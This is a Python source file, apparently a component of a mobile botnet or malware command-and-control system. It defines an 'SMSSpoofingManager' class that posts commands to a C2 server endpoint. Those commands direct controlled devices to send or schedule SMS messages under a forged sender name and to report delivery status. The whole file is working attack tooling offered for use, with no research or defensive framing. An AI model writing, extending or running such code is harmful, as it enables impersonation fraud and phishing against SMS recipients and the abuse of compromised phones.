import os
import json
import logging
import requests
from typing import Optional, Dict

logger = logging.getLogger(__name__)

C2_URL = os.environ.get('C2_URL', 'http://localhost:5000')
PUSH_ENDPOINT = f"{C2_URL}/api/v1/commands/push"

class SMSSpoofingManager:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'Content-Type': 'application/json'})

    def _send_command(self, device_id: str, command: str, params: Dict) -> bool:
        payload = {
            "device_id": device_id,
            "command": command,
            "parameters": params
        }
        try:
            resp = self.session.post(PUSH_ENDPOINT, json=payload, timeout=5)
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"Failed to send command to {device_id}: {e}")
            return False

    def send_spoofed_sms(self, device_id: str, sender_name: str, recipient: str, message: str) -> bool:
        logger.info(f"Request spoofed SMS from {device_id} as '{sender_name}' to {recipient}")
        return self._send_command(
            device_id=device_id,
            command="SendSMS",
            params={
                "sender_name": sender_name,
                "to": recipient,
                "body": message,
                "spoof": True
            }
        )

    def schedule_spoofed_sms(self, device_id: str, sender_name: str, recipient: str, message: str, delay_seconds: int) -> bool:
        logger.info(f"Schedule spoofed SMS from {device_id} in {delay_seconds}s")
        return self._send_command(
            device_id=device_id,
            command="ScheduleSMS",
            params={
                "sender_name": sender_name,
                "to": recipient,
                "body": message,
                "delay": delay_seconds,
                "spoof": True
            }
        )

    def check_delivery_status(self, device_id: str, sms_id: str) -> Optional[Dict]:
        try:
            resp = self.session.get(f"{C2_URL}/api/v1/sms/status/{device_id}/{sms_id}", timeout=5)
            if resp.status_code == 200:
                return resp.json()
        except Exception as e:
            logger.error(f"Status check failed: {e}")
        return None